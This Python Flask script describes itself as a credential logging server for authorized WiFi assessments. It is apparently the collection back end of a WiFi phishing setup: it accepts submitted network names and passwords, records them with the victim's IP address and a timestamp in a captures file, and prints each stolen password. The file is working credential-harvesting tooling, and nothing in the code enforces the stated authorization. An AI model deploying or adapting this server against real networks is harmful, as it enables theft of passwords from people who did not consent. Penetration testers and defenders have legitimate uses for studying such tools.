#!/usr/bin/env python3
"""Credential logging server for authorized WiFi assessments."""
from flask import Flask, request
from datetime import datetime
import os

app = Flask(__name__)
CAPTURE_FILE = os.path.join(os.path.dirname(__file__), "captures", "captured.txt")

@app.route("/log", methods=["POST"])
def log():
    ssid = request.form.get("ssid", "?")
    pwd  = request.form.get("password", "?")
    ip   = request.remote_addr
    line = f"[{datetime.now():%Y-%m-%d %H:%M:%S}] ip={ip} ssid={ssid} pass={pwd}\n"
    os.makedirs(os.path.dirname(CAPTURE_FILE), exist_ok=True)
    with open(CAPTURE_FILE, "a") as f:
        f.write(line)
    print(f"[+] {line.strip()}")
    return "OK"

@app.route("/")
def index():
    return "logging server up", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
